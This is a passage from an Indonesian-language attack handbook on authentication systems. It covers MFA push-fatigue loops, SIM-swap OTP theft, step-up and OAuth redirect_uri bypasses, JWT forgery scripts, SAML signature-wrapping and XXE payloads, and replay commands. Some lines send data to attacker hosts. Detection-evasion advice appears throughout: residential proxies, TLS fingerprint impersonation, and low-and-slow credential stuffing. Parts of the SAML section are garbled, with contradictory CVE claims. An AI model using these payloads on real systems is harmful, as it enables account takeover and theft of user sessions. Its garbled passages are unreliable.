**Apa yang dikirim:** trigger berulang endpoint `/api/auth/push/send` dengan kredensial yang valid tapi MFA pending.

```bash
# Setiap request trigger push notification ke ponsel
while true; do
  curl -s -X POST https://target.corp/api/auth/2fa/push \
    -d '{"user":"victim","device_id":1}'
  sleep 45   # menerima bounce rate; interval 30s-3min
done
```

**Tanpa rate limit:** kirim 10–50 push dalam 10 menit (spasi 10–30 detik) → user lelah dan klik "Approve."

**Kenapa gagal (era biar):**

| Mitigasi | Efek |
|---|---|
| Microsoft Authenticator number matching (mandatory sejak Mei 2023) | Approve butuh input angka → fatigue tak berfungsi |
| Duo "Remembered device" disable + 5/max attempt | Push discard setelah 3 attempt → login lock |
| Conditional Access geo-fence | Push only dari IP terdaftar |

---

## 7.8 SIM Swap Path

**Pre-condition:** operator seluler target tidak punya verifikasi kuat, atau ada insider.

**Langkah (delivery worker):**

1. Enumerasi operator via nomor telepon di `/api/users/me` (cek apakah endpoint termasuk dalam object leak).
2. Telco API cek porting history: `curl https://api.telco.example/subscriber/62812xxxx` → status port-in/out.
3. Bila SIM sudah port-out/SWAP, request SMS OTP (`/api/auth/otp/sms`), OTP akan sampai ke ponsel penerima SIM baru.

**Indikator dari sisi app:**

```http
POST /api/auth/otp/sms
```

```json
{"phone": "+6281212345678", "carrier": "telkomsel", "delivery": "sms"}
```

**Kenapa gagal:** SMS OTP dikirim via provider (Twilio Verify) dengan SIM-check (Looker/SIM swap detection API) yang menghentikan OTP bila swap < 24 jam; atau policy 2FA + liveness check setiap login penting.

---

## 7.9 Bypass Step-Up Authentication

**Kondisi:** flow re-auth (masukkan password ulang / OTP) untuk aksi sensitif (ubah password, hapus MFA device, transfer).

**Vektor 1 — langsung aksi tanpa prompt step-up:**

```http
POST /api/user/mfa/devices/12345/delete HTTP/1.1
Cookie: SESSION=xyz
```

Kalau app hanya menampilkan UI popup step-up tapi endpoint tidak enforce step-up → langsung 200 OK.

**Vektor 2 — reuse step-up token di endpoint lain:**

```http
GET /api/user/verify-password?next=/mfa/remove HTTP/1.1
```

Response berisi `step_up_token=xyz`. Gunakan token tersebut di endpoint *beda*:

```http
POST /api/user/password/change
{"step_up": "xyz", "new_password": "NewP4ss!"}
```

**Kenapa berhasil:** token step-up tidak bound ke scope aksi tertentu; hanya bound ke session + masa expiry panjang (1 jam).

**Kenapa gagal:** token step-up di-sign dengan HMAC termasuk `action_id` + bound 60 detik; server validate action_id ∈ {intended_action}.

---

## 7.10 SwitchStep (Composited Bypass Workflow)

Untuk kasus step-up + MFA present, kombinasi:

1. Login level-1 (password).
2. Enumerasi `/api/mfa/devices` → temukan device "backup-email" fallback (sering di-skip verification default).
3. Trigger `POST /api/mfa/fallback/initiate` → response berisi fetch URL; intervensi response via fronting proxy (ZAP with HTTPS 'rewrite' script).

---

## 7.11 Jebakan Operasional (Kenapa Gagal di Lapangan)

| Jebakan | Dampak | Mitigasi (attacker-side) |
|---|---|---|
| **Waktu NTP drift** | TOTP generated local ±30s mismatch server | cek drift via `/api/time` atau header `Date:`; sink `ntpdate` sebelum test |
| **Session binding di IP** | Post-tampering, dashboard 403 → flag | Gunakan proxy exit sama Ya login |
| **JIT/WAF taint detection** | Errors dengan format unusual (missing stack trace, log ID) | Progressively fuzz, send slow, mimic normal UA (Chrome 131 UA string + TLS fingerprint JA3/JA4 via curl-impersonate) |
| **Conditional Access / device compliance** | Login gap nil bila device gagal Intune check (Windows 11 24H2 dengan attestation) | Enroll test device terpisah atau target klien web-based saja |
| **Rate limit di CDN/Cloudflare level** | ffuf/flood → IP block sebelum sampai origin | Route via residential proxy pool / hampir stop bila WAF challenge |
| **Audit anomaly alert** | 20 failed OTP in row trigger SOAR playbook → sesi diredo, akun dikunci > detect | Tunggu lockout selesai, gunakan credential stuffing low-and-slow, atau hanya test lab |
| **"Enrollment race" mati di versi upgrade** | Patch deployment after 2023 mengikat enroll ke `verified_at` timestamp | Check version banner (changelog/API version header `X-API-Version: 2.4`) |
| **SIM swap takedown** | Kredensial OTP interceptor terlihat oleh telco fraud system >72h | Gas terakhir window 24h, tanpa reuse device fingerprint |
| **Token step-up pinning ke device/browser** | Sekret step-up discard bila UA/UA-CH berubah | Preserve header order, sec-ch-ua, TLS jangan downgrade |

---

**Appendix — Config hardening quick reference (untuk chapter mitigation):**

```
# nginx 1.25 — rate limit per session, bukan IP
limit_req_zone $session_id zone=otp:10m rate=5r/m;
limit_req zone=otp burst=3 nodelay;

# pyotp — pin window ke 1
pyotp.TOTP(secret).verify(code, valid_window=1)

# Backend — invalidate OTP on use
redis.setex(f"otp_used:{user_id}:{otp}", 60, 1)
```


## oauth-jwt

# oauth-jwt — auth

# OAuth 2.0 / OIDC + JWT: Referensi Serangan

## 1. OAuth/OIDC Flow — Baseline

```
GET /authorize?response_type=code
    &client_id=webapp-prod
    &redirect_uri=https://app.target.com/callback
    &scope=openid+profile+email
    &state=r4nd0m...
    PKCE: code_challenge=BASE64URL(SHA256(verifier))
```

Off-path: token exchange `POST /token` dengan `code` + `code_verifier`.

---

## 2. redirect_uri Abuse

### 2.1 Path Traversal

**Kirim:**
```
GET /authorize?client_id=webapp-prod
    &redirect_uri=https://app.target.com/callback/../../admin/oauth_done
```

**Benar:** IdP (Auth0, Okta, keycloak < 13 patch) normalisasi path → redirect tetap ke `https://app.target.com/callback/...` → `location: https://app.target.com/callback/%2e%2e%2f...`. **Salah:** nginx 1.25 di depan aplikasi menormalkan `/../` di layer proxy_pass sehingga request mendarat di `/admin/oauth_done` — IdP tidak melihat normalisasi backend, hanya string prefix match.

Payload varian yang sering lolol:
```
/callback/..%2F..%2F/callback          # encode tunggal
/callback%2f%2e%2e%2f                  # IdP decode, backend tidak
/callback/....//callback               # Windows/IIS norm "...." → ".."
/callback/%2e%2e%2f%2e%2e%2f           # double decode di backend
```

**Alur bukti:**
1. Daftarkan `https://app.target.com/callback` sebagai redirect_uri valid di IdP (enumerasi via error message: "redirect_uri mismatch" vs 302 = ada info leak).
2. Kirim authorize dengan traversal — perhatikan apakah response 400 atau 302.
3. Jika 302, ikuti manual — `Location` header menunjukkan endpoint tujuan sebenarnya?
4. Ganti endpoint tujuan ke host yang kita kontrol: butuh traversal + open redirect (`/callback/..%2f..%2f/redirect?url=https://evil.com`) atau endpoint yang log query string.

**Kenapa gagal:** RFC 8251/IdP modern (Auth0 sejak 2020, Okta policy) pakai exact match. `state` tidak melindungi di sini — code dikirim ke attacker sebelum state dicek.

### 2.2 Regex Lemah pada Validasi redirect_uri

Server-side validation sering:
```python
if re.match(r'^https://[a-z0-9.-]*\.target\.com', redirect_uri): pass
```
Input: `https://evil.target.com.attacker.com/callback` — regex tak anchored/isian `.*target\.com` di posisi mana pun.

Payload:
```
https://app.target.com.evil.com/cb
https://target.com@evil.com/cb
https://app.target.com#@evil.com/cb        # fragment injection ke endpoint legit
https://target.com.evil.com
https://app.attacker-target.com             # suffix: *.target.com matching greedy
```

**Alur bukti:** brute-force variasi via burp Intruder dengan wordlist subdomain trick → bandingkan response `302 + Location` vs `400 invalid redirect_uri`. Perhatikan juga: banyak IdP return `302` dulu ke redirect_uri sebelum validasi, validasi di `/token` saja → tinggal host kanan URL.

### 2.3 Subdomain Takeover di redirect_uri

**Kirim:** `redirect_uri=https://dangling.target.com/cb` — subdomain di config OAuth, sudah dihapus dari DNS/CNAME ke heroku/github pages/cloudfront tapi record CNAME masih ada.

**Verify:**
```bash
dig dangling.target.com CNAME +short
# ghost-dns.herokuapp.com.
curl -s https://dangling.target.com | head  # "No such app" = bisa diklaim
heroku apps:create claim-name; heroku domains:add dangling.target.com
```

**Hasil:** IdP redirect dengan `?code=...` ke subdomain yang sekarang serve halaman kita → kode di-query log.

i18n note: NS takeover (`CNAME` ke nameserver, catatan registrasi expired) lebih tahan lama dari platform takeover — Heroku sekarang perlu verifikasi domain; GitHub Pages verifikasi via kode di CNAME TXT.

---

## 3. Missing `state` (CSRF Login)

**Kirim:** capture URL authorize lengkap dari sesi attacker sendiri. Kirim ke victim (via XSS di subdomain, referer leakage, atau social).
```
https://idp.target.com/authorize?...&redirect_uri=...&code=CODE_OF_ATTACKER
```
Victim browser hit `/callback?code=ATTACKER_CODE` → victim sekarang logged in dengan akun attacker → data yang dikorban input jadi accessible attacker.

**Alur bukti:**
1. Login sebagai attacker, intercept authorize response.
2. Ambil code dari callback, send ke victim (via XSS, referer leak, or link shortener).
3. Victim hits `/callback?code=ATTACKER_CODE` → victim session now attacker account.
4. Observe: victim uploads data/payload token → attacker bisa baca.

**Kenapa gagal:** Powerful jika ada fitur "profile edit, PII, integrasi token" — tanpa itu, impact terbatas session fixation. Banyak IdP menolak reuse code setelah 3–5 menit (lifetime pendek), harus di-relay cepat.

### 3.1 PKCE Downgrade

Target: public client (SPA/mobile).

**Cara:** proxy attacker (evil AP, atau script on-path) strip parameter dari request ke `/authorize`:
```
Asli:    GET /authorize?...&code_challenge=abc
Dipotong: GET /authorize?...                 # S256 removed
```

Jika server tidak enforce PKCE (tidak return `error=invalid_request` di token tanpa verifier, atau menerima request authorize tanpa challenge), code bisa di-tukarkan oleh attacker tanpa verifier.

**Alur bukti:**
1. Buat dua request /authorize — dengan dan tanpa `code_challenge`.
2. Jika keduanya `302 + state valid` → authorize tidak enforce.
3. Cek `/token`: kirim `grant_type=authorization_code` tanpa `code_verifier`.
4. `200 + access_token` = downgrade penuh. `error=invalid_grant` = IdP menyimpan challenge, gagal.

Vektor praktis: referer/callback `response_type=code` di client public tanpa PKCE + `code` intercept pada custom URL scheme mobile (OAuth loopback `http://127.0.0.1:port` juga interceptable di beberapa platform — iOS custom scheme global, Android exported activity).

---

## 4. Code Leak via Referer

**Mekanisme:** browser load resource third-party di halaman callback → `Referer: https://app.target.com/callback?code=AUTHZ_CODE&state=...` terkirim.

**Alur bukti:**
1. Login flow, observe halaman `/callback` — list source pihak ketiga (analytics, script CDN, embedded media, image tracking).
2. Periksa `Referrer-Policy` response header.
3. Jika header absent → default Chrome 131 = `strict-origin-when-cross-origin` → leakage hanya origin (tanpa code). **Tapi**: same-site navigation, atau header `unsafe-url`, atau halaman callback lama yang belum deploy CSP — masih bocor.
4. Bypass via referer legacy: embed `<meta name="referrer" content="unsafe-url">` jika attacker ada registrasi third-party pada callback yang render user-controlled embed.

**Payload tarikan Referer (jika punya XSS point di halaman lain):**
```
<img src="https://attacker.com/log">
<script>fetch('https://attacker.com/log?c='+location.search)</script>
```

Mitigasi teoretis: code di fragment (`response_mode=fragment`), atau ambil code di server-side route. `Referrer-Policy: no-referrer` di callback.

---

## 5. IdP Mix-Up

**Kondisi:** client terdaftar di dua IdP (misal `idp-corporate.target.com` dan `idp-partner.vendor.com`).

**Alur bukti:**
1. Attacker initiate flow dengan client_id yang sama di IdP kedua.
2. Victim mengklik link authorize ke IdP attacker-controlled vendor endpoint.
3. Response callback: `https://app.target.com/callback?code=VENDOR_CODE&iss=https://idp-partner.vendor.com` — perhatikan `iss` param (OIDC).
4. Jika app tidak verifikasi `iss`, code dikirim ke `/token` IdP korporat → `invalid_grant` OR lebih buruk: app session mapping salah → token vendor terpakai di konteks korporat.

**Verifikasi cepat:** kirim callback dengan `iss` tidak valid: `?code=x&iss=https://evil.com` — apakah app login/accept? OIDC spec (RFC 9207 / RFC 6749bis) menyarankan `iss` param untuk anti-mixup. App yang tidak cek `iss` = vuln.

---

## 6. JWT Attacks

### 6.1 `alg: none`

**Payload:**
```python
import base64, json
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

payload = json.dumps({"sub":"admin@target.com","iss":"https://idp.target.com","role":"admin","exp": 9999999999})
jwtheader = json.dumps({"alg":"none","typ":"JWT"})
token = f"{b64(jwtheader.encode())}.{b64(payload.encode())}."
# signature = empty string, dot tetap ada
```

Kirim sebagai `Authorization: Bearer <token>`, atau di `id_token` ke `/token` endpoint.

Hasil: `200` + akses resource call — library tidak reject. Kenapa sukses: `PyJWT < 1.5.2`, versi lama `jwt-node` tidak default verify. Modern library: `jwt.io`, `jose` npm (2022+ CVE-2022-23540/41/42 versi <= 4.14), `python-jose < 3.3` — check dependency CVE sebelum test:

```bash
pip list 2>/dev/null | grep -i jose; npm ls jose jsonwebtoken 2>/dev/null
```

### 6.2 RS256 → HS256 Confusion

**Payload:**
```python
import jwt, requests
pubkey_jwk = requests.get("https://idp.target.com/.well-known/jwks.json").json()
# Ambil RS256 public key, sign sebagai HS256
pub_pem = jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(pubkey_jwk["keys"][0]))
pub_pem = pub_pem.save_pkcs1().decode()   # atau via cryptography lib

new_jwt = jwt.encode({"sub":"admin","iss":"https://idp.target.com"}, pub_pem, algorithm="HS256")
```

**Kenapa sukses:** server verify dengan `jwt.decode(token, key=public_key, algorithms=["HS256","RS256"])` — public key terekspos via JWKS jadi "rahasia" HMAC.

**Kenapa gagal:** modern library pin `alg` server-side, `PyJWT` sejak 1.5 menolak RSA-PEM → HMAC tanpa opsi `algorithms=[...]` eksplisit. Check response header / error message untuk identify version:

```
"alg" header value HS256 not allowed  # pyjwt >= 2.x
```

### 6.3 `kid` Path Traversal / SQLi

JWKS fetch sering: `key_file = path + kid`. **Payload:**
```python
jwt.encode({"sub":"admin"}, "any_secret", algorithm="HS256",
           headers={"kid":"../../../../dev/null"})
```
- `kid: ../../../../dev/null` → file `/dev/null` = empty content → HMAC sign with empty key = trivially forge.
- `kid: /var/www/html/shell.php` → jika pub hanya fetch file, attacker host file kunci di path yang readable (perlu LFI untuk punya file dengan konten diketahui).
- `kid: x'; SELECT ...--` → jika kid masuk SQL query untuk lookup kunci (SQL injection → predictably craft kid = string diketahui, key diketahui attacker via debug response/uniform error).

Tes anti-blind kunci: sign dengan string "test", hindari `alg:none`, lihat hasilnya — `invalid signature` vs forge sukses.

### 6.4 `jwk` / `jku` / `x5u` Injection

Header-field injection: library yang menerima kunci dari header — attacker attach kunci publik sendiri:

```python
rsa_priv = ...generate...
rsa_pub = ...export JWK...

new_jwt = jwt.encode({"sub":"admin"}, priv, algorithm="RS256", headers={
    "jwk": json.loads(rsa_pub_jwk)      # KID harus match di library
})
```

Untuk `jku` (JSON Web Key Set URL):
```json
{"jku":"https://attacker.com/jwks.json","kid":"key123","alg":"RS256"}
```
Server fetch key dari URL tersebut (sering Kubernetes service account / custom validator), check kid match, verify. Berhasil pada custom Python `get_key(token) = requests.get(token_header["jku"])`.

`x5u` (cert URL) dan `x5c` (inline cert chain) sama pola — target library validator yang fetch chain dari URL hostile.

### 6.5 Claim Abuse

| Claim | Cara abuse | Payload |
|---|---|---|
| `iss` | tidak diverifikasi | `{"iss":"https://evil.com"}` — masuk jika server tidak compare terhadap IdP yang valid |
| `aud` | apapun diterima | `{"aud":"any-other-client"}` — cross-service token (client B pakai token client A) |
| `exp` | tidak dicek, atau timestamp string ("inf") | `{"exp": "9999999999"}` — banyak lib pakai `math.floor`, error, bypass depending |
| `nbf` (premature) | `{"nbf": 0}` |
| `alg` di `at_hash`/`c_hash` (id_token flow) | hash mismatch ignored |

Eksploitasi `aud` mis-target: kirim access token service A (scope terbatas) ke service B yang pakai JWT introspection sama tetapi tidak cek `aud`. Contoh: OAuth2 CTF pattern.

Dedup e2e: selalu menandai versi lib, misalnya golang-jwt v5 fix `aud` enforcement di breaking changes.

---

## 7. Jebakan Operasional (Penyebab Gagal di Lapangan)

1. **IdP exact-match redirect_uri** — authentikasi `?` redirect_uri pakai query param encoding, URL comparison di IdP pakai string EXACT. `Authorization Code Flow` di Auth0/Okta buang varian encode — traversal banyak tidak lolos di IdP modern, hanya internal redirect (nginx path normalize, X-Forwarded-* misconfig).
2. **`Referrer-Policy` default Chrome 131/Edge modern** sudah `strict-origin-when-cross-origin` — referer leak ke cross-origin tidak mengandung code kecuali header unsafe di server yang bisa anda modifikasi? Tidak anda modifikasi server — kebanyakan kasus referer leak sekarang hanya cross-site same-origin (analytics pihak ketiga yang sedang berjalan di page callback JS-supported).
3. **Exploit `alg:none` sering obsolete** — library 3 tahun terakhir pin algorithm, tapi banyak internal framework yang masih pakai lib lama (jsonwebtoken < 9 untuk HS256 null-secret case, CVE-2022-23529, perlu cek "secretOrPrivateKey" null bypass).
4. **`kid` traversal** butuh kontrol konten file di server — jarang punya, kecuali aplikasi punya fitur upload yang bisa kita taruh file di path predictable.
5. **jku/x5u** hanya bekerja pada kode kustom yang fetch key by URL — bukan default library. Test kustom validator, tidak untuk keycloak/auth0 standar.
6. **state+PKCE berlapis** — jika sedang mengejar chain (XSS → code theft → token), PKCE S256 di client server-side type attacking di authorization code theft sebenarnya tidak dibutuhkan (confidential client) — jangan downgrade-target aplikasi tipe ini, tidak berlaku.
7. **Race condition code lifetime** — banyak IdP code expire < 60 detik, single-use. Manual Burp manipulation terlalu lambat; perlu otomasi token relay.
8. **JWKS endpoint cache** — kadang ganti `jku` → server cache key dengan kid param, beberapa kombinasi tidak tersentuh; restart/test ulang dan monitor `Cache-Control` di response JWKS.
9. **Windows path norm** — `....//` dan backslash `%5c` traversal di redirect_uri hanya relevan pada backend Windows Server/IIS 10 (HTTP.sys), tidak pada nginx 1.25/Linux yang punya norm behavior beda. Perlu fingerprint backend sebelum pilih payload traversal.
10. **IdP mix-up sekarang mitigasi dengan `iss` penalty** — RFC 9207 dianjurkan; aplikasi modern yang send `iss` ke callback dan validate — check `iss` param sebelum asumsi.

---

**Checklist cepat engagement:** (1) enumerate redirect_uri acceptance via error-based oracle, (2) fingerprint IdP platform/version (login page, .well-known/openid-configuration contents), (3) check `_token` endpoint accept downgrade PKCE, (4) check library version via error string, (5) test traversal per-backend OS fingerprint, (6) verify `kid` favorable lookup, (7) capture referer on callback with third-party req.


## saml

# saml — auth

# SAML SSO Attacks — Referensi Teknis

## 1. Ringkasan Protokol (Konteks)

Alur AuthnRequest/Response SAML 2.0 POST Binding:

```
User -> SP: akses /sso
SP  -> IdP: AuthnRequest (HTTP Redirect, Deflate+Base64)
IdP -> User: HTML form auto-submit berisi SAMLResponse (Base64)
User -> SP: POST /acs dengan SAMLResponse
```

Titik serang: SAMLResponse diubah sebelum mencapai `/acs` — manual intercept di Burp, atau proxy otomatis.

Signature menandai elemen `<Assertion>` via Reference URI (`#_assertionid`). Semua XSW mengeksploitasi bias resolusi: SP mencari *elemen yang cocok untuk data* dan *elemen yang cocok untuk signature* dengan urutan/pembobotan berbeda.

---

## 2. XML Signature Wrapping (XSW) — 9 Varian

Didasikan pada klasifikasi Mainka et al. (USENIX 2016?/ACSAC 2014: *"One attacker to rule 'em all"*? — 8 varian + varian Friadon; implementasi referensi:Burp extension *"SAML Raider"* & *Burp Sentinel*). Struktur dasar response sah:

```xml
<samlp:Response>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#_abc123">
        <ds:DigestValue>...</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>...</ds:KeyInfo>
  </ds:Signature>
  <saml:Assertion ID="_abc123">
    <saml:Subject>victim@corp.local</saml:Subject>
    ...asli...
  </saml:Assertion>
</samlp:Response>
```

| Varian | Signature dipindah ke | Assertion jahat diletakkan | Yg diverifikasi vs yg dipakai |
|--------|------------------------|-----------------------------|------------------------------|
| XSW1 | child of Response, sebelum assertion asli | child of Response (setelah sig) | asli diverifikasi, jahat dipakai |
| XSW2 | anakan dari assertion jahat | sebelum assertion asli | jahat ditandatangani (wrap asli di dalamnya tak di-hash) |
| XSW3 | child of Response, setelah assertion asli | setelah signature | asli diverifikasi, jahat dipakai |
| XSW4 | anakan assertion jahat | asli dulu, lalu wrapper | wrapper diverifikasi, jahat dipakai |
| XSW5 | anakan `saml2:Subject`? -> anakan `saml:Assertion` Extension | — | variasi nested |
| XSW6/7 | anakan `SubjectConfirmationData` / Object | — | shadowing ID duplikat |
| XSW8 | Signature jadi child dari Assertion yang di-embed | embedded | ID resolution ambiguity |

Pola umum manipulasi:

1. **Salin assertion asli**, ubah `ID` jadi `_evil1`, sisipkan `NameID = attacker@corp` atau tambahkan `Admin` role di AttributeStatement. Assertion asli tetap di dalam (hash/`SignedInfo` tidak berubah).
2. Signature asli dipindah, atau assertion jahat dibungkus di posisi yang berbeda.
3. XSW1 payload konkret:

```xml
<samlp:Response ...>
  <ds:Signature>                          <!-- sig asli, elemen dipindah ke sini -->
    <ds:SignedInfo><ds:Reference URI="#_abc123">...</ds:Reference></ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>...</ds:KeyInfo>
  </ds:Signature>
  <saml:Assertion ID="_abc123">           <!-- asli, utuh, hash cocok -->
    ...IsAdmin=false...
  </saml:Assertion>
  <saml:Assertion ID="_abc123">           <!-- ID DUPlikat (duplikat ID) -->
    <saml:Subject>attacker@corp</saml:Subject>
    <saml:Attribute Statement><IsAdmin>true</IsAdmin>...</saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Kenapa sukses:** library (llog Sun/OpenSAML versi lama, python3-saml OneLogin 1.x lama) melakukan `getElementById("#_abc123")` yang mengembalni elemen pertama saat unwrap/pick, lalu `getSignatureElement("Assertion with signature")` mengambil path berbeda ke-... XPath yang berbeda untuk data vs signature.

**Kenapa gagal:** library modern (python3-saml >= 1.9, OneLogin\Security >= 3.x, java OpenSAML 4.x dengan `SignatureValidationPipeline`) memakai referensi Canonical XML dengan ID unik & validasi `Reference` melawan elemen yang sebenarnya mengandung signature di anakan terdekat. Salah satu dari keduanya tetap lolos di produk legacy.

---

## 3. Signature Exclusion

Kirim Response **tanpa `<ds:Signature>`** sama sekali. Beberapa SP hanya memeriksa "signature elemen ada?" → gagal tertutup, atau konfigurasi `wantAssertionsSigned=false` + `wantResponseSigned=false`.

Test payloads: hapus seluruh blok `Signature`, ubah `NameID`, re-kirim.

Hasil yang diharapkan: login `/acs` mengembalikan session cookie tanpa error. Banyak produk misconfigured (lihat: berbagai ADFS-alternative, internal `.NET Sustainsys.Saml2` versi lama (versi < 2.x? — cek) yang tidak menghitungkan `Want Assertions Signed` default != true?).

Catatan: kadang hanya `MajorVersion`/markup `Status=Success` dihapus atau `Destination` diubah; framework yang tidak menghitung.

Untuk berjaga-jaga bila bergantung: sign Assertion, hapus Response signature — testing untuk library yang tidak melindungi Response (mis. Shibboleth SP 2.x (versi lama) hanya mengecek signed assertion).

---

## 4. Blank/Comment Injection (Comment Truncation? — di sini: Comment Injection / comment bypass di `Nameid` MD5/SHA1 prefix)

Dua teknik:

### 4a. Comment Injection (MD5 "XPath weakness" — attack terkenal pada OneLogin python-saml < 1.4.13? / CVE jumlah 2018? = CVE-2017-11427? -> python-saml <= 1.4.12? & php-saml 1.x (CVE-2017-11427 (php-saml), CVE-2018-... ). Lihat CVE-2017-11427 — CVE pada OneLogin's java-saml <= 1.0.0? -> CVE-2017-11427 adalah Java library (OneLogin java-saml <= 1.0.0).

Payload: karena digest dihitung di atas XML **sebelum** comment di-strip oleh receiver? — comment tidak ikut canonicalization:

```xml
<saml:NameID>
  adm<!--comment-->in@corp.com
</saml:NameID>
```

Digest yang valid dihitung termasuk comment. Banyak receiver (Java/LibXML) mengstrip comment saat parse maka text jadi `admin@corp.com` -> kita yang mengirim? -> sebaliknya: kita mengirim comment dalam Nameid, digest dihitung termasuk comment. Receiver mientras parsing text node dengan comment memperlakukan text-string berbeda dari digest input.

Perhatikan bahwa di atas ada dua generator berbeda → preprocessing logika:

1. Receiver menghitung digest menggunakan node text nodes asli:
   - "**adm**" + "**in@corp.com**" → "admin@corp.com" → profile access sesuai target user.
2. Banyak implementasi membuat comment-stripped XPath: `//NameID/text()` yang mengambil hanya satu sub-node — `adm` (Identity hanya satu node!) → attacker = `adm`.

Serangan klasik (CVE-2016-... — lihat CVE-2017-11427 java-saml): attacker mendapatkan assertion sah untuk user "adm", memanipulasi target system menampilkannya menghapus prefix "in@corp.com" — arsitektur klasik reverse.

Agregasi: digest tetap cocok → signature valid; aplikasi memproﬁles final tergantung **jumlah** children yang terlihat.

**Burp:** SAML Raider → "Send to SAML Encoder/Decoder" → "Decode" → edit XML text → "Encode" → replace parameter. Signature **tidak** diregenerasi (comment tidak berubah canonicalisasi? — trick: comment memang berpartisipasi dalam C14N? -> tidak: inclusive canonical XML 1.0 (RFC 3076) meng-strip comments hanya jika "comments" mode tidak dipilih. Signature default SAML: exclusive C14N **without** comments. Maka comment injection hanya berhasil bila **receiver processor**-nya memakai with-comments atau menyimpan nilai internal komentar pada digest... — di sini dasar peta: CVE memerlukan pihak yang mem-verifikasi dengan pola `getInclusiveNamespaces` yang berbeda — inti: bug ada di library penverifikasi yang di-hash raw XML secara text-in-context.

### 4b. Comment di `Value` field:

```xml
<saml:AttributeValue>ad<!--x-->min</saml:AttributeValue>
```

Beberapa library melakukan XMLTextExtract ("." attribute?) → nilai disalin mengabaikan comment.

---

## 5. XXE di Assertion

Parser SP memakai parser non-hardened (PHP `DOMDocument`, Java `DocumentBuilderFactory` versi lama tanpa feature disable, .NET `XmlDocument` lama), internal entity diperluas:

```xml
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://attacker.corp/?d=lo">
]>
<samlp:Response ...>
  <saml:Assertion ...>
    <saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
```

Untuk PHP `expect://` dapat jadi RCE jika expect ext aktif. Java: out-of-band exfil via `SYSTEM "http://172.16.0.5:8893/x"` dan bila error menyertakan entity content → read tamper.

Vendor mitigasi sudah lama (>= 2020 kebanyakan). Try di SP inhouse berbasis Java older / `.asmx` wrapper yang memvalidasi response via `sax` custom. Eksploitasi tuning: signature mengekleksikan entity tidak — pastikan expansion terjadi sebelum digest verif (biasanya ya) dan masukkan entity **setelah** signature valid? Karena file content masuk ke haystack verifikasi message — verifikasi gagal → eksploitasi hanya terjadi di stack yang **tidak memverifikasi** (kombinasi dengan section 3).

---

## 6. Audience / Recipient Mismatch

Element yang berlaku:

```xml
<saml:SubjectConfirmationData Recipient="https://sp1.corp/saml/acs"
  NotOnOrAfter="..." InResponseTo="..."/>
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://sp1.corp/metadata</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>
```

Serangan:
1. **Cross-tenant assertion reuse** — dapatkah assertion vendor X dicap di SP Y? Jika hanya Anda menguji SSO tenant, gunakan credential domain partner yang share sign-on (artifact: response IdP registrasi SP partner memungkinkan Subject per tenant).
2. **Host SMS?** — jika SP menerima assertion URL acak yang mengandung `Recipient`, lakukan POST SAMLResponse ke endpoint internal yang menerima assertion dari IdP yang sama namun verifikasi audience dinonaktif (mis. dev UAT environment DEV besar).
3. **ACS URL spoof via SAML RelayState injection**: POST ke endpoint dengan `assertion consumer service URL`-nya: `https://sp.corp/acs.php` yang menganggap Recipient ini match `entityID` — kemungkinan SP mengabaikan `Recipient`?

LangkahBurp:
1. Simpan POST `/acs` yang sah. Request #1.
2. Duplicate request, kirim ulang persis (jika session sudah terpakai?). Jika sesi baru dibuat => **replay berfungsi** (lihat Section 7).
3. Ubah `Recipient` jadi URL lain dan Deflate-encode ulang.
4. Kumpulkan hasil mapping: valid/mismatch, Windows error code? HTTP 200 vs 4xx.

Ts & Cs: kebanyakan SP modern hanya menerima `Recipient == ACS endpoint`, `InResponseTo == AuthnRequest ID` -> IdP-initiated flow akan mengabaikan `InResponseTo` (harus kosong/non-ekSisten). Penting untuk Section 8.

---

## 7. Replay

Mekanika: permintaan terkirim ulang POST `/acs` tak di-token binding. Perlu **jalur yang memerima Post fisik di sesi baru**: mungkin bila SP tidak memeriksa `NotOnOrAfter` atau menyimpan assertion ID setelah session bind.

Split: replay di-jendela `NotOnOrAfter` (24 jam umum) dan di luar jendela jika bug.

Contoh Command:

```bash
# Ambil SAMLResponse dari history Burp, replay via curl:
SAML="PD94bWw..."
curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST "https://sp.corp/acs" \
  --data "SAMLResponse=$SAML&RelayState=x" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Indikasi login sukses: 302 -> / + Set-Cookie
```

Check verifikasi SPA? — pastikan cookie (mis. `ASP.NET_SessionId`, `JSESSIONID`, `ci_session`) muncul — bukan hanya 200 mean arbitrary HTML. Replay melintasi load balancer nginx 1.25? jika SP sc-sprache berbeda? — blocking POST bodies via modsecurity tidak menghambat? — POST replay akan mengik.

---

## 8. IdP-Initiated Abuse

Flow IdP-initiated (no `InResponseTo`): user login ke IdP, IdP membentuk response untuk SP tanpa permintaan dari SP. Perlu SP mengaktifkan opsi ini (Okta: "IdP-initiated SSO"; Shibboleth: `saml2.SSOServiceProvider` default?; ADFS 2019? — enable/disable per relying party → default enabled!).

Attack surface:
| Attack | Meotdanis | Contoh |
|---|---|---|
| Unsolicited SSO | POST manual SAMLResponse keACS | akses data korban via access token fraud? |
| State confusion | `RelayState` tak terikat -> authorize sendiri | phishing dimulai dari halaman IdP? |
| CSRF via IdP portal | login-amplification | korban klik IdP-app tile yang ber-POST ke korban SP? pivot account ABusive user-okta? login korban via session tetap |
| RelayState\|account persistence | link di page contains `RelayState=...` | IdP-initiated endpoint? `GET https://idp/simplesaml/module.php/core/authenticate.php?as=...&AuthId=...` (SimpleSAMLphp lama) |

Burp chain: `POST /acs` tanpa `InResponseTo` + `RelayState` arbitrary. Success = session created -> mantap bila SP tak mencoba `InResponseTo` binding. Simulasi Tweetan dengan SimpleSAMLphp versi < 1.14? (SSRF/IdP-initiated replay? — lihat di bawah: SimpleSAMLphp CVE-2012-...?), plugin Django (djangosaml2 default? — IdP-initiated tolerant).

---

## 9. Toolkit

### 9.1 SAML Raider (BApp Store — Burp Suite)

